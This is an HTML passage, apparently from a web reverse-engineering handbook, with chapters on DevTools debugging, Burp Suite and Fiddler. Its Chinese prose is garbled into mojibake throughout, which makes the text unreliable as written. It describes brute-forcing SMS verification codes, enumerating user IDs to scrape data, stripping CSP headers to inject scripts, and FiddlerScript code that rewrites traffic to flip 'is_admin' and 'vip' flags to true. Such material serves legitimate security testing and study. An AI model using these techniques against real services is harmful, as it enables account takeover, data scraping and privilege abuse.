<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="p">});</span>
</code></pre>
      </div>

      <ul>
        <li><strong>é€†å‘åœºæ™¯</strong>: å¦‚æœéªŒè¯ç æˆ–åŠ å¯†é€»è¾‘åœ¨ iframe ä¸­ï¼Œä¸»é¡µé¢é€šè¿‡ postMessage è·å– tokenï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨ message äº‹ä»¶çš„ç›‘å¬å™¨ã€‚</li>
      </ul>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>æŒæ¡ Web API çš„ Hook æŠ€æœ¯æ˜¯ JS é€†å‘çš„â€œåŸºæœ¬åŠŸâ€ã€‚æ— è®ºæ˜¯ XHR/Fetch çš„ç½‘ç»œå±‚æ‹¦æˆªï¼Œè¿˜æ˜¯ Cookie/Storage çš„æ•°æ®å±‚ç›‘æ§ï¼Œäº¦æˆ–æ˜¯ Canvas/Navigator
        çš„ç¯å¢ƒå±‚å¯¹æŠ—ï¼Œæ ¸å¿ƒæ€è·¯éƒ½æ˜¯ï¼š<strong>æ‰¾åˆ°å…³é”® API -> æ›¿æ¢å®ç° (Hook) -> æ’å…¥ç›‘æ§ä»£ç /ä¿®æ”¹é€»è¾‘ -> è°ƒç”¨åŸå§‹å®ç°</strong>ã€‚</p>

    </div>
  </div>
  <div class="chapter">
    <h1 class="no-page-break">ğŸ“„ Part III: Tools & Ingredients</h1>

    <div class="section" id="02-Tooling-browser-devtools">
      <h2>15. Browser DevTools</h2>
      <h1 id="æµè§ˆå™¨å¼€å‘è€…å·¥å…·-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…· (DevTools)</h1>

      <h2 id="æ€è€ƒæ—¶åˆ»">ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>

      <p>åœ¨æ·±å…¥å­¦ä¹  DevTools ä¹‹å‰ï¼Œå…ˆæ€è€ƒï¼š</p>

      <ol>
        <li><strong>ä½ çœŸçš„ä¼šç”¨ F12 å—ï¼Ÿ</strong> é™¤äº†çœ‹ HTML å’Œ Networkï¼Œä½ è¿˜ç”¨è¿‡å“ªäº›åŠŸèƒ½ï¼Ÿ</li>
        <li><strong>æ–­ç‚¹è°ƒè¯•çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ</strong> ä¸ºä»€ä¹ˆè¯´"ä¼šæ‰“æ–­ç‚¹çš„äººï¼Œæ‰ç®—ä¼šè°ƒè¯•"ï¼Ÿ</li>
        <li><strong>åŠ¨æ€ vs é™æ€ï¼š</strong> ä¸ºä»€ä¹ˆè¯´"åŠ¨æ€è°ƒè¯•æ¯”é™æ€åˆ†ææ›´æœ‰æ•ˆ"ï¼Ÿ</li>
        <li><strong>å®æˆ˜åœºæ™¯ï¼š</strong> ä¸€ä¸ªæŒ‰é’®ç‚¹å‡»åï¼Œå‘é€äº†åŠ å¯†è¯·æ±‚ï¼Œä½ æ— æ³•ä»ä»£ç é‡Œæœåˆ°è¯·æ±‚ URLï¼ˆå› ä¸ºæ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼‰ã€‚ä½ ä¼šå¦‚ä½•å®šä½åˆ°ç”ŸæˆåŠ å¯†å‚æ•°çš„ä»£ç ï¼Ÿ</li>
      </ol>

      <p>æŒæ¡ DevToolsï¼Œå°±æ˜¯æŒæ¡äº†é€†å‘çš„ä¸»åŠ¨æƒã€‚</p>

      <hr />

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>DevTools æ˜¯é€†å‘å·¥ç¨‹å¸ˆæœ€é¡ºæ‰‹çš„å…µå™¨ã€‚é™¤äº†åŸºç¡€çš„æŸ¥çœ‹å…ƒç´ å’Œå‘åŒ…,é€šè¿‡æŒæ¡ä¸€äº›é«˜çº§è°ƒè¯•æŠ€å·§ï¼ˆConditional Breakpoints, Local Overrides, Custom
        Snippetsï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å¤§å¹…æå‡é€†å‘æ•ˆç‡ã€‚</p>

      <hr />

      <h2 id="1-elements-é¢æ¿">1. Elements é¢æ¿</h2>

      <p>é™¤äº†æŸ¥çœ‹ DOM ç»“æ„ï¼Œé€†å‘ä¸­å¸¸ç”¨ï¼š</p>

      <h3 id="dom-æ–­ç‚¹-dom-breakpoints">DOM æ–­ç‚¹ (DOM Breakpoints)</h3>

      <p>å½“ä¸çŸ¥é“æ˜¯è°ä¿®æ”¹äº†æŸä¸ª DOM å…ƒç´ ï¼ˆä¾‹å¦‚ç”Ÿæˆäº†éªŒè¯ç å›¾ç‰‡ï¼Œæˆ–è€…æ’å…¥äº†åŠ å¯†çš„ Token è¾“å…¥æ¡†ï¼‰æ—¶ï¼Œä½¿ç”¨å®ƒã€‚</p>

      <ul>
        <li><strong>Subtree modifications</strong>: ç›‘å¬å­èŠ‚ç‚¹å˜åŒ–ã€‚</li>
        <li><strong>Attribute modifications</strong>: ç›‘å¬å±æ€§å˜åŒ–ï¼ˆå¦‚ <code>class</code>, <code>src</code>,
          <code>value</code>ï¼‰ã€‚</li>
        <li><strong>Node removal</strong>: ç›‘å¬èŠ‚ç‚¹è¢«åˆ é™¤ã€‚</li>
      </ul>

      <blockquote>
        <p><strong>æŠ€å·§</strong>: æ–­ä¸‹åï¼ŒæŸ¥çœ‹ Call Stack (è°ƒç”¨æ ˆ)ï¼Œé€šå¸¸èƒ½ç›´æ¥å®šä½åˆ°æ“ä½œ DOM çš„ JS ä»£ç ã€‚</p>
      </blockquote>

      <hr />

      <h2 id="2-console-é¢æ¿">2. Console é¢æ¿</h2>

      <p>ä¸ä»…ä»…æ˜¯æ‰“å°æ—¥å¿—ã€‚</p>

      <h3 id="å®ç”¨æŒ‡ä»¤-console-api">å®ç”¨æŒ‡ä»¤ (Console API)</h3>

      <ul>
        <li><code>debug(fn)</code>: å½“æŒ‡å®šå‡½æ•° <code>fn</code> è¢«è°ƒç”¨æ—¶ï¼Œè‡ªåŠ¨æ–­ç‚¹ã€‚</li>
        <li><code>monitor(fn)</code>: å½“ <code>fn</code> è¢«è°ƒç”¨æ—¶ï¼Œè‡ªåŠ¨ Log è¾“å‡ºå‚æ•°ã€‚</li>
        <li><code>queryObjects(Constructor)</code>: <strong>å¼ºåŠ›å·¥å…·</strong>ã€‚æŸ¥æ‰¾æ‰€æœ‰è¯¥æ„é€ å‡½æ•°çš„å®ä¾‹ã€‚
          <ul>
            <li>ä¾‹å¦‚ï¼š<code>queryObjects(WebSocket)</code> å¯ä»¥åˆ—å‡ºå½“å‰é¡µé¢æ‰€æœ‰çš„ WebSocket è¿æ¥å¯¹è±¡ã€‚</li>
          </ul>
        </li>
        <li><code>getEventListeners(node)</code>: è·å– DOM èŠ‚ç‚¹ç»‘å®šçš„æ‰€æœ‰äº‹ä»¶ç›‘å¬å™¨ã€‚</li>
      </ul>

      <h3 id="å½“å‰ä¸Šä¸‹æ–‡-context">å½“å‰ä¸Šä¸‹æ–‡ (Context)</h3>

      <p>Console å·¦ä¸Šè§’å¯ä»¥é€‰æ‹© Execution Contextã€‚å¦‚æœç½‘é¡µä½¿ç”¨äº† iframe æˆ–è€… Web Workerï¼Œè®°å¾—åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼Œå¦åˆ™è®¿é—®ä¸åˆ°é‡Œé¢çš„å˜é‡ã€‚</p>

      <hr />

      <h2 id="3-sources-é¢æ¿">3. Sources é¢æ¿</h2>

      <p>è°ƒè¯•çš„æ ¸å¿ƒæˆ˜åœºã€‚</p>

      <h3 id="xhrfetch-breakpoints">XHR/Fetch Breakpoints</h3>

      <p>åœ¨å³ä¾§é¢æ¿å‹¾é€‰ &#8220;XHR/fetch breakpoints"ï¼Œè¾“å…¥ URL å…³é”®è¯ï¼ˆå¦‚ <code>/login</code>, <code>sign</code>ï¼‰ã€‚</p>

      <ul>
        <li>å½“å‘ç”ŸåŒ…å«è¯¥å…³é”®è¯çš„ç½‘ç»œè¯·æ±‚æ—¶ï¼Œä¼šåœ¨ <code>send()</code> æˆ– <code>fetch()</code> è°ƒç”¨å¤„æ–­ä¸‹ã€‚</li>
      </ul>

      <h3 id="event-listener-breakpoints">Event Listener Breakpoints</h3>

      <p>ä¸æƒ³æ‰‹åŠ¨æ‰¾ DOM ç»‘å®šäº‹ä»¶ï¼Ÿç›´æ¥å‹¾é€‰ <code>Mouse -&gt; click</code> æˆ– <code>Keyboard -&gt; keydown</code>ã€‚</p>

      <h3 id="snippets-ä»£ç ç‰‡æ®µ">Snippets (ä»£ç ç‰‡æ®µ)</h3>

      <p>åœ¨ &#8220;Snippets&#8221; æ ‡ç­¾é¡µå¯ä»¥ä¿å­˜å¸¸ç”¨çš„ Hook è„šæœ¬ã€‚</p>

      <ul>
        <li><strong>ä¼˜ç‚¹</strong>: è·¨é¡µé¢é€šç”¨ï¼Œé€šè¿‡ <code>Ctrl+Enter</code> å¿«é€Ÿæ‰§è¡Œã€‚</li>
        <li><strong>åœºæ™¯</strong>: æ³¨å…¥é€šç”¨çš„ Cookie Hook, Debugger Bypass è„šæœ¬ã€‚</li>
      </ul>

      <h3 id="local-overrides-æœ¬åœ°æ›¿æ¢">Local Overrides (æœ¬åœ°æ›¿æ¢)</h3>

      <p><strong>é€†å‘ç¥å™¨</strong>ã€‚å…è®¸ä½ ä¿®æ”¹çº¿ä¸Šçš„ JS æ–‡ä»¶å¹¶åœ¨æœ¬åœ°ä¿å­˜ï¼Œåˆ·æ–°é¡µé¢åä¾ç„¶ç”Ÿæ•ˆã€‚</p>

      <ol>
        <li>é™¤äº† &#8220;Overrides&#8221; æ ‡ç­¾é¡µï¼Œé€‰æ‹©ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶å¤¹ã€‚</li>
        <li>åœ¨ &#8220;Network&#8221; æˆ– &#8220;Sources&#8221; é¢æ¿æ‰¾åˆ° JS æ–‡ä»¶ï¼Œå³é”® -> &#8220;Save for overrides"ã€‚</li>
        <li>ç›´æ¥ç¼–è¾‘ä»£ç ï¼ŒCtrl+S ä¿å­˜ã€‚</li>
        <li><strong>ç”¨é€”</strong>: åˆ é™¤æ··æ·†ä»£ç ä¸­çš„åè°ƒè¯•é€»è¾‘ã€æ³¨å…¥ Log ä»£ç ã€ä¿®æ”¹åŠ å¯†å‡½æ•°çš„è¿”å›å€¼ã€‚</li>
      </ol>

      <hr />

      <h2 id="4-network-é¢æ¿">4. Network é¢æ¿</h2>

      <h3 id="initiator-å‘èµ·è€…">Initiator (å‘èµ·è€…)</h3>

      <p>åœ¨è¯·æ±‚åˆ—è¡¨ä¸­ï¼Œé¼ æ ‡æ‚¬åœåœ¨ &#8220;Initiator&#8221; åˆ—ã€‚</p>

      <ul>
        <li>å®ƒä¼šæ˜¾ç¤ºè¿™å°±è¯·æ±‚çš„è°ƒç”¨æ ˆé“¾ã€‚ç‚¹å‡»è“è‰²çš„æ–‡ä»¶åï¼Œç›´æ¥è·³è½¬åˆ°å‘åŒ…çš„ JS ä»£ç ã€‚</li>
      </ul>

      <h3 id="replay-xhr-é‡æ”¾">Replay XHR (é‡æ”¾)</h3>

      <p>å³é”®è¯·æ±‚ -> &#8220;Replay XHR"ã€‚å¿«é€Ÿé‡å‘è¯·æ±‚ï¼Œç”¨äºæµ‹è¯•ç­¾åçš„æ—¶æ•ˆæ€§ã€‚</p>

      <h3 id="block-request-url-å±è”½è¯·æ±‚">Block Request URL (å±è”½è¯·æ±‚)</h3>

      <p>å³é”®è¯·æ±‚ -> &#8220;Block Request URL"ã€‚</p>

      <ul>
        <li><strong>ç”¨é€”</strong>: å±è”½æŸäº›ç¬¬ä¸‰æ–¹çš„ç›‘æ§è„šæœ¬ã€å¹¿å‘Šè„šæœ¬ï¼Œæˆ–è€…å±è”½åŠ è½½ Wasm æ–‡ä»¶ä»¥å¼ºåˆ¶é™çº§åˆ° JS ç‰ˆæœ¬ï¼ˆå¦‚æœç½‘ç«™æœ‰é™çº§é€»è¾‘ï¼‰ã€‚</li>
      </ul>

      <hr />

      <h2 id="5-application-é¢æ¿">5. Application é¢æ¿</h2>

      <h3 id="storage">Storage</h3>

      <p>ç›´æ¥æŸ¥çœ‹å’Œä¿®æ”¹ LocalStorage, SessionStorage, Cookies, IndexedDBã€‚</p>

      <h3 id="service-workers">Service Workers</h3>

      <p>æœ‰äº›ç½‘ç«™ä½¿ç”¨ SW æ¥æ‹¦æˆªè¯·æ±‚æˆ–åšç¼“å­˜ã€‚å¦‚æœè°ƒè¯•æ—¶å‘ç° Network é¢æ¿è¡Œä¸ºæ€ªå¼‚ï¼ˆå¦‚è¯·æ±‚ç›´æ¥ä» ServiceWorker è¿”å›ï¼‰ï¼Œå¯ä»¥åœ¨ &#8220;Service Workers&#8221; æ ‡ç­¾é¡µå‹¾é€‰
        &#8220;Bypass for network&#8221; æˆ–ç›´æ¥ &#8220;Unregister"ã€‚</p>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>ç†Ÿç»ƒä½¿ç”¨ DevTools çš„é«˜çº§åŠŸèƒ½ï¼Œå¯ä»¥è®©ä½ åœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œå¿«é€Ÿåˆ‡å…¥ä¸šåŠ¡é€»è¾‘çš„æ ¸å¿ƒã€‚</p>

      <ul>
        <li>æ‰¾ä¸åˆ°å…¥å£ï¼Ÿç”¨ <strong>Event Listener / XHR Breakpoints</strong>ã€‚</li>
        <li>æ‰¾åˆ°äº†æ··æ·†ä»£ç æƒ³æ”¹ï¼Ÿç”¨ <strong>Local Overrides</strong>ã€‚</li>
        <li>æƒ³æ‰¾éšè—çš„å¯¹è±¡ï¼Ÿç”¨ <strong>Console <code>queryObjects</code></strong>ã€‚</li>
      </ul>

    </div>

    <div class="section" id="02-Tooling-burp-suite-guide">
      <h2>16. Burp Suite Guide</h2>
      <h1 id="burp-suite-æŒ‡å—">Burp Suite æŒ‡å—</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Burp Suite ä¸ä»…ä»…æ˜¯æ¸—é€æµ‹è¯•ç¥å™¨ï¼Œä¹Ÿæ˜¯ Web é€†å‘ä¸­æœ€å¼·å¤§çš„ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰å·¥å…·ã€‚å®ƒä¸ä»…èƒ½æŠ“åŒ…ï¼Œè¿˜èƒ½ä¿®æ”¹é‡å‘ã€æš´åŠ›ç ´è§£ç­¾åã€è‡ªåŠ¨åŒ–è§£ç ç­‰ã€‚æœ¬æŒ‡å—ä»…å…³æ³¨é€†å‘å·¥ç¨‹ä¸­å¸¸ç”¨çš„åŠŸèƒ½ã€‚</p>

      <hr />

      <h2 id="1-åŸºç¡€é…ç½®-proxy-cert">1. åŸºç¡€é…ç½® (Proxy &amp; Cert)</h2>

      <h3 id="æ‹¦æˆª-https-æµé‡">æ‹¦æˆª HTTPS æµé‡</h3>

      <ol>
        <li><strong>é…ç½®ä»£ç†</strong>: æµè§ˆå™¨è®¾ç½®ä»£ç†ä¸º <code>127.0.0.1:8080</code> (Burp é»˜è®¤ç«¯å£)ã€‚</li>
        <li><strong>å®‰è£…è¯ä¹¦</strong>: è®¿é—® <code>http://burp</code>ï¼Œä¸‹è½½ CA è¯ä¹¦ã€‚
          <ul>
            <li><strong>Windows/Mac</strong>: åŒå‡»å®‰è£…ï¼ŒåŠ¡å¿…é€‰æ‹©â€œå—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„â€ã€‚</li>
            <li><strong>Android/iOS</strong>: å®‰è£…è¯ä¹¦åï¼Œéœ€åœ¨ç³»ç»Ÿè®¾ç½®ä¸­â€œé’ˆå¯¹æ ¹è¯ä¹¦å¯ç”¨å®Œå…¨ä¿¡ä»»â€ã€‚</li>
          </ul>
        </li>
      </ol>

      <h3 id="invisible-proxy-éšå½¢ä»£ç†">Invisible Proxy (éšå½¢ä»£ç†)</h3>

      <p>å½“å®¢æˆ·ç«¯ï¼ˆå¦‚æŸäº›éæµè§ˆå™¨å‘åŒ…çš„ EXE æˆ– Python è„šæœ¬ï¼‰ä¸æ”¯æŒé…ç½®ä»£ç†ï¼Œæˆ–è€…å¼ºåˆ¶æ ¡éªŒ Host å¤´æ—¶ï¼š</p>

      <ol>
        <li>ä¿®æ”¹ Hosts æ–‡ä»¶ï¼Œå°† <code>target.com</code> æŒ‡å‘ <code>127.0.0.1</code>ã€‚</li>
        <li>Burp -> Proxy -> Options -> Edit Interface <code>127.0.0.1:443</code> -> Request handling -> Support
          invisible proxying (True).</li>
        <li>è¿™æ ·æ‰€æœ‰å‘å¾€æœ¬åœ° 443 çš„æµé‡éƒ½ä¼šè¢« Burp æ‹¦æˆªå¹¶è½¬å‘ã€‚</li>
      </ol>

      <hr />

      <h2 id="2-repeater-é‡æ”¾å™¨">2. Repeater (é‡æ”¾å™¨)</h2>

      <p>è¿™æ˜¯é€†å‘ä¸­æœ€å¸¸ç”¨çš„æ¨¡å—ã€‚</p>

      <ul>
        <li><strong>åŸºæœ¬ç”¨æ³•</strong>: åœ¨ Proxy History ä¸­å³é”®è¯·æ±‚ -> &#8220;Send to Repeater&#8221; (Ctrl+R)ã€‚</li>
        <li><strong>ç”¨é€”</strong>:
          <ul>
            <li>ä¿®æ”¹å‚æ•°ï¼ˆå¦‚ <code>id=1</code> æ”¹ <code>id=2</code>ï¼‰æµ‹è¯•è¶Šæƒã€‚</li>
            <li>åˆ é™¤ç‰¹å®šçš„ Headerï¼ˆå¦‚ <code>Signature</code>ï¼‰æµ‹è¯•æ˜¯å¦å¿…é¡»ã€‚</li>
            <li>æµ‹è¯• Token çš„æœ‰æ•ˆæœŸã€‚</li>
          </ul>
        </li>
      </ul>

      <hr />

      <h2 id="3-intruder-å…¥ä¾µè€…">3. Intruder (å…¥ä¾µè€…)</h2>

      <p>ç”¨äºè‡ªåŠ¨åŒ–çˆ†ç ´ã€‚</p>

      <ul>
        <li><strong>åœºæ™¯</strong>:
          <ul>
            <li>çˆ†ç ´çŸ­ä¿¡éªŒè¯ç  (4 ä½/6 ä½)ã€‚</li>
            <li>éå†ç”¨æˆ· ID çˆ¬å–æ•°æ®ã€‚</li>
            <li>å¦‚æœç­¾åç®—æ³•å·²çŸ¥ï¼Œå¯ä»¥å†™æ’ä»¶ï¼ˆExtenderï¼‰è‡ªåŠ¨è®¡ç®—ç­¾åè¿›è¡Œæ‰¹é‡è¯·æ±‚ã€‚</li>
          </ul>
        </li>
      </ul>

      <hr />

      <h2 id="4-decoder-è§£ç å™¨">4. Decoder (è§£ç å™¨)</h2>

      <p>å†…ç½®çš„ç¼–ç è½¬æ¢å·¥å…·ã€‚</p>

      <ul>
        <li>æ”¯æŒ URL, Base64, Hex, Gzip ç­‰å¸¸è§æ ¼å¼ã€‚</li>
        <li><strong>Smart Decode</strong>: æ™ºèƒ½å°è¯•è§£ç ï¼Œå¯¹ä»˜å¤šå±‚ç¼–ç ï¼ˆå¦‚ Base64 é‡Œé¢åŒ… URL ç¼–ç ï¼‰å¾ˆæœ‰æ•ˆã€‚</li>
      </ul>

      <hr />

      <h2 id="5-match-and-replace-è‡ªåŠ¨æ›¿æ¢">5. Match and Replace (è‡ªåŠ¨æ›¿æ¢)</h2>

      <p>åœ¨ Proxy -> Options -> Match and Replace ä¸­è®¾ç½®è§„åˆ™ã€‚</p>

      <ul>
        <li><strong>é€†å‘åœºæ™¯</strong>:
          <ul>
            <li><strong>Bypass CSP</strong>: è‡ªåŠ¨åˆ é™¤å“åº”å¤´ä¸­çš„ <code>Content-Security-Policy</code>ï¼Œå…è®¸æˆ‘ä»¬åœ¨é¡µé¢æ‰§è¡Œä»»æ„ JSã€‚</li>
            <li><strong>ä¿®æ”¹è¿”å›åŒ…</strong>: å°† <code>{"is_vip": false}</code> è‡ªåŠ¨æ›¿æ¢ä¸º <code>{"is_vip": true}</code>ã€‚</li>
            <li><strong>æ³¨å…¥è„šæœ¬</strong>: åœ¨ <code>&lt;body&gt;</code> æ ‡ç­¾åè‡ªåŠ¨æ’å…¥
              <code>&lt;script src="http://127.0.0.1/hook.js"&gt;&lt;/script&gt;</code>ã€‚</li>
          </ul>
        </li>
      </ul>

      <hr />

      <h2 id="6å¸¸ç”¨æ’ä»¶-extensions">6.å¸¸ç”¨æ’ä»¶ (Extensions)</h2>

      <p>ä» BApp Store å®‰è£…ï¼š</p>

      <ol>
        <li><strong>Logger++</strong>: æ›´å¼ºå¤§çš„æ—¥å¿—æŸ¥çœ‹å™¨ï¼Œæ”¯æŒæœç´¢ã€‚</li>
        <li><strong>Turbo Intruder</strong>: åŸºäº Python çš„è¶…é«˜æ€§èƒ½å‘åŒ…å™¨ã€‚</li>
        <li><strong>HackBar</strong>: ç±»æµè§ˆå™¨æ’ä»¶çš„è¾…åŠ©å·¥å…·ã€‚</li>
      </ol>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>åœ¨ Web é€†å‘ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸å°† Burp Suite é…åˆæµè§ˆå™¨ DevTools ä½¿ç”¨ï¼š</p>

      <ul>
        <li><strong>DevTools</strong> è´Ÿè´£åˆ†æ JS é€»è¾‘ï¼Œç”Ÿæˆç­¾åã€‚</li>
        <li><strong>Burp Suite</strong> è´Ÿè´£æ‹¦æˆªè¯·æ±‚ï¼ŒéªŒè¯ç­¾åï¼Œé‡æ”¾æ”»å‡»ã€‚</li>
      </ul>

    </div>

    <div class="section" id="02-Tooling-fiddler-guide">
      <h2>17. Fiddler Guide</h2>
      <h1 id="fiddler-classic-æŒ‡å—">Fiddler Classic æŒ‡å—</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Fiddler (Classic) æ˜¯ä¸€æ¬¾å†å²æ‚ ä¹…ã€åŠŸèƒ½å¼ºå¤§çš„æŠ“åŒ…å·¥å…·ã€‚è™½ç„¶ç•Œé¢ç¨æ˜¾å¤å¤ï¼Œä½†å…¶æ ¸å¿ƒä¼˜åŠ¿åœ¨äº<strong>FiddlerScript</strong>â€”â€”å…è®¸ä½ ç”¨ C# ä»£ç æå…¶çµæ´»åœ°æ§åˆ¶ HTTP
        è¯·æ±‚çš„æ¯ä¸€ä¸ªç»†èŠ‚ã€‚</p>

      <hr />

      <h2 id="1-åŸºç¡€é…ç½®">1. åŸºç¡€é…ç½®</h2>

      <h3 id="tools-options-https">Tools -> Options -> HTTPS</h3>

      <ul>
        <li>å‹¾é€‰ &#8220;Decrypt HTTPS traffic"ã€‚</li>
        <li>ç‚¹å‡» &#8220;Actions&#8221; -> &#8220;Trust Root Certificate"ã€‚</li>
      </ul>

      <h3 id="tools-options-connections">Tools -> Options -> Connections</h3>

      <ul>
        <li>Fiddler listens on port: 8888 (é»˜è®¤)ã€‚</li>
        <li>å‹¾é€‰ &#8220;Allow remote computers to connect&#8221; (å¦‚æœè¦æŠ“æ‰‹æœºåŒ…)ã€‚</li>
      </ul>

      <hr />

      <h2 id="2-æ ¸å¿ƒåŠŸèƒ½">2. æ ¸å¿ƒåŠŸèƒ½</h2>

      <h3 id="composer-æ„é€ å™¨">Composer (æ„é€ å™¨)</h3>

      <ul>
        <li><strong>åŠŸèƒ½</strong>: æ‰‹åŠ¨æ„é€  HTTP è¯·æ±‚ã€‚</li>
        <li><strong>ç”¨é€”</strong>: ç±»ä¼¼ Burp Repeaterï¼Œä½†æ›´åå‘äºä»é›¶æ„é€ è¯·æ±‚ã€‚å¯ä»¥ç›´æ¥æ‹–æ‹½å·¦ä¾§çš„ Session åˆ° Composer tab æ¥å¿«é€Ÿå¡«å……ã€‚</li>
      </ul>

      <h3 id="autoresponder-è‡ªåŠ¨å“åº”å™¨">AutoResponder (è‡ªåŠ¨å“åº”å™¨)</h3>

      <ul>
        <li><strong>åŠŸèƒ½</strong>: è‡ªåŠ¨åŒ¹é…è§„åˆ™å¹¶è¿”å›é¢„è®¾å†…å®¹ã€‚</li>
        <li><strong>ç”¨é€”</strong>: æ›¿æ¢çº¿ä¸Šæ–‡ä»¶ï¼ˆç±»ä¼¼ Charles Map Localï¼‰ã€‚
          <ul>
            <li>Rule: <code>REGEX:(?insx).*\/script\.js</code></li>
            <li>Action: <code>C:\Users\Admin\Desktop\hook.js</code></li>
          </ul>
        </li>
      </ul>

      <hr />

      <h2 id="3-fiddlerscript-ç»ˆææ€å™¨">3. FiddlerScript (ç»ˆææ€å™¨)</h2>

      <p>ç‚¹å‡» Fiddler ä¸‹æ–¹çš„ &#8220;FiddlerScript&#8221; æ ‡ç­¾é¡µã€‚è¿™æ˜¯åŸºäº JScript.NET çš„è„šæœ¬ç¯å¢ƒã€‚</p>

      <h3 id="å¸¸ç”¨-hook-ç‚¹">å¸¸ç”¨ Hook ç‚¹</h3>

      <h4 id="onbeforerequest-è¯·æ±‚å‰">OnBeforeRequest (è¯·æ±‚å‰)</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">OnBeforeRequest</span><span class="p">(</span><span class="n">oSession</span><span class="p">:</span><span class="w"> </span><span class="n">Session</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ‹¦æˆªç‰¹å®š URL</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">oSession</span><span class="p">.</span><span class="n">uriContains</span><span class="p">(</span><span class="s">&quot;/api/v1/sign&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// ä¿®æ”¹è¯·æ±‚ä½“</span>
<span class="w">        </span><span class="kt">var</span><span class="w"> </span><span class="n">sBody</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oSession</span><span class="p">.</span><span class="n">GetRequestBodyAsString</span><span class="p">();</span>
<span class="w">        </span><span class="n">sBody</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sBody</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s">&quot;vip=false&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;vip=true&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">oSession</span><span class="p">.</span><span class="n">utilSetRequestBody</span><span class="p">(</span><span class="n">sBody</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// æ‰“å° Log åˆ° Fiddler Log é¢æ¿</span>
<span class="w">        </span><span class="n">FiddlerObject</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&quot;Tampered body: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sBody</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="onbeforeresponse-å“åº”å‰">OnBeforeResponse (å“åº”å‰)</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">OnBeforeResponse</span><span class="p">(</span><span class="n">oSession</span><span class="p">:</span><span class="w"> </span><span class="n">Session</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">oSession</span><span class="p">.</span><span class="n">HostnameIs</span><span class="p">(</span><span class="s">&quot;api.target.com&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">oSession</span><span class="p">.</span><span class="n">utilDecodeResponse</span><span class="p">();</span><span class="w"> </span><span class="c1">// è§£ç  gzip</span>
<span class="w">        </span><span class="kt">var</span><span class="w"> </span><span class="n">sBody</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oSession</span><span class="p">.</span><span class="n">GetResponseBodyAsString</span><span class="p">();</span>

<span class="w">        </span><span class="c1">// æ›¿æ¢ JSON å†…å®¹</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sBody</span><span class="p">.</span><span class="n">Contains</span><span class="p">(</span><span class="s">&quot;\&quot;is_admin\&quot;:false&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">sBody</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sBody</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s">&quot;\&quot;is_admin\&quot;:false&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;\&quot;is_admin\&quot;:true&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">oSession</span><span class="p">.</span><span class="n">utilSetResponseBody</span><span class="p">(</span><span class="n">sBody</span><span class="p">);</span>
<span class="w">            </span><span class="n">oSession</span><span class="p">.</span><span class="n">oResponse</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">Remove</span><span class="p">(</span><span class="s">&quot;Content-Security-Policy&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// ç§»é™¤ CSP</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="ä¸ºä»€ä¹ˆç”¨-fiddlerscript">ä¸ºä»€ä¹ˆç”¨ FiddlerScriptï¼Ÿ</h3>

      <ul>
        <li>æ¯”ç®€å•çš„æ­£åˆ™æ›¿æ¢æ›´çµæ´»ï¼ˆæ”¯æŒ if-else é€»è¾‘ï¼‰ã€‚</li>
        <li>å¯ä»¥è°ƒç”¨ .NET åº“è¿›è¡Œå¤æ‚çš„åŠ è§£å¯†æ“ä½œã€‚</li>
      </ul>

      <hr />

